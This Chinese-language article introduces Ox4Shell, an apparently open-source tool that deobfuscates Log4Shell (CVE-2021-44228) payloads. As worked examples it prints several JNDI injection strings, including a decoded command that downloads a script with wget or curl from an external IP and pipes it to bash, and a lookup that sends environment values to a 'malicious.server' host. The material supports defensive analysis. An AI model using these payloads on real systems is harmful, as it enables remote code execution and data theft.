![](https://image.3001.net/images/20220831/1661950004_630f583445b58915e05df.png!small)

## 关于Ox4Shell

Ox4Shell是一款针对Log4Shell
Payload代码反混淆工具，自从Log4Shell漏洞（CVE-2021-44228）被发现之后，很多工具都开始尝试对Log4Shell
Payload进行混淆处理，以便更好地利用这个漏洞去实施攻击，这也给广大研究人员带来了很大的麻烦。

该工具旨在帮助广大研究人员查看经过混淆处理的Log4Shell Payload的真实内容。比如说，下面这个Payload已经经过了混淆处理：

    
    
    ${zrch-Q(NGyN-yLkV:-}${j${sm:Eq9QDZ8-xEv54:-ndi}${GLX-MZK13n78y:GW2pQ:-:l}${ckX:2@BH[)]Tmw:a(:-da}${W(d:KSR)ky3:bv78UX2R-5MV:-p:/}/1.${)U:W9y=N:-}${i9yX1[:Z[Ve2=IkT=Z-96:-1.1}${[W*W:w@q.tjyo@-vL7thi26dIeB-HxjP:-.1}:38${Mh:n341x.Xl2L-8rHEeTW*=-lTNkvo:-90/}${sx3-9GTRv:-Cal}c$c${HR-ewA.mQ:g6@jJ:-z}3z${uY)u:7S2)P4ihH:M_S8fanL@AeX-PrW:-]}${S5D4[:qXhUBruo-QMr$1Bd-.=BmV:-}${_wjS:BIY0s:-Y_}p${SBKv-d9$5:-}Wx${Im:ajtV:-}AoL${=6wx-_HRvJK:-P}W${cR.1-lt3$R6R]x7-LomGH90)gAZ:NmYJx:-}h}

运行Ox4Shell之后，上述Payload便会被转换成直观易读的形式：

    
    
    ${jndi:ldap://1.1.1.1:3890/Calc$cz3z]Y_pWxAoLPWh}

除此之外，该工具还可以识别和解码Base64命令，比如说下列经过混淆处理的Payload：

    
    
    ${jndi:ldap://1.1.1.1:1389/Basic/Command/Base64/KHdnZXQgLU8gLSBodHRwOi8vMTg1LjI1MC4xNDguMTU3OjgwMDUvYWNjfHxjdXJsIC1vIC0gaHR0cDovLzE4NS4yNTAuMTQ4LjE1Nzo4MDA1L2FjYyl8L2Jpbi9iYXNoIA==}

运行Ox4Shell之后，该工具便能够揭示攻击者的真正意图：

    
    
    ${jndi:ldap://1.1.1.1:1389/Basic/(wget -O - http://185.250.148.157:8005/acc||curl -o - http://185.250.148.157:8005/acc)|/bin/bash

## 工具下载

广大研究人员可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/ox-eye/Ox4Shell.git

## 工具使用

    
    
    ~/Ox4Shell » python ox4shell.py --help
    
    usage: ox4shell [-h] [-d] [-m MOCK] [--max-depth MAX_DEPTH] [--decode-base64] (-p PAYLOAD | -f FILE)
    
     
    
       ____       _  _   _____ _          _ _
    
      / __ \     | || | / ____| |        | | |
    
     | |  | |_  _| || || (___ | |__   ___| | |
    
     | |  | \ \/ /__   _\___ \| '_ \ / _ \ | |
    
     | |__| |>  <   | | ____) | | | |  __/ | |
    
      \____//_/\_\  |_||_____/|_| |_|\___|_|_|
    
     
    
    Ox4Shell - Deobfuscate Log4Shell payloads with ease.
    
        Created by https://oxeye.io
    
     
    
    General:
    
      -h, --help            显示工具帮助信息和退出
    
      -d, --debug           启用调试模式 (默认: False)
    
      -m MOCK, --mock MOCK  模拟数据JSON文件路径，用于替换Payload重的特定信息 (默认: mock.json)
    
      --max-depth MAX_DEPTH
    
                            针对Payload执行的最大迭代次数 (默认: 150)
    
      --decode-base64       包含待解码Base64数据的PayloadP (默认: False)
    
     
    
    Targets:
    
      Choose which target payloads to run Ox4Shell on
    
     
    
      -p PAYLOAD, --payload PAYLOAD
    
                            待反混淆的单个 (默认: None)
    
      -f FILE, --file FILE      包含待反混淆的Payload文件路径 (默认: None)

## 模拟数据

Log4j代码库有几个独特的查询函数，允许用户查找环境变量和Java进程的运行时信息等。这种功能将允许攻击者能够探测特定信息，而这些信息可以唯一识别目标设备。

Ox4Shell使用了mock.json文件来向特定查询函数中插入常见值，比如说，如果Payload包含一个${env:HOME}值，我们就可以使用自定义模拟数据来替换它了。

默认提供的模拟数据如下：

    
    
    {
    
        "hostname": "ip-127.0.0.1",
    
        "env": {
    
            "aws_profile": "staging",
    
            "user": "ubuntu",
    
            "pwd": "/opt/",
    
            "path": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin"
    
        },
    
        "sys": {
    
            "java.version": "16.0.2",
    
            "user.name": "ubuntu"
    
        },
    
        "java": {
    
            "version": "Java version 16.0.2",
    
            "runtime": "OpenJDK Runtime Environment (build 1.8.0_181-b13) from Oracle Corporation",
    
            "vm": "OpenJDK 64-Bit Server VM (build 25.181-b13, mixed mode)",
    
            "os": "Linux 5.10.47-linuxkit unknown, architecture: amd64-64",
    
            "locale": "default locale: en_US, platform encoding: UTF-8",
    
            "hw": "processors: 1, architecture: amd64-64"
    
        }
    
    }

比如说，我们可以使用Ox4Shell的模拟数据能力来对下列Payload进行反混淆处理：

    
    
    ~/Ox4Shell >> python ox4shell.py -p "\${jndi:ldap://\${sys:java.version}.\${env:AWS_PROFILE}.malicious.server/a}"  
    
    ${jndi:ldap://16.0.2.staging.malicious.server/a}

## 使用建议

我们建议使用提供的文件（-f）来运行Ox4Shell，而不要使用（-p）直接提供Payload，因为特定的Shell环境可能会转义掉重要字符。

## 许可证协议

本项目的开发与发布遵循[ _MIT_](https://github.com/ox-eye/Ox4Shell/blob/main/LICENSE)开源许可证协议。

## 项目地址

 **Ox4Shell** ：【[ _GitHub传送门_](https://github.com/ox-eye/Ox4Shell)】

## 参考资料

> [ _https://twitter.com/Daniel_Abeles_](https://twitter.com/Daniel_Abeles)
>
> [ _https://twitter.com/ron_vider_](https://twitter.com/ron_vider)

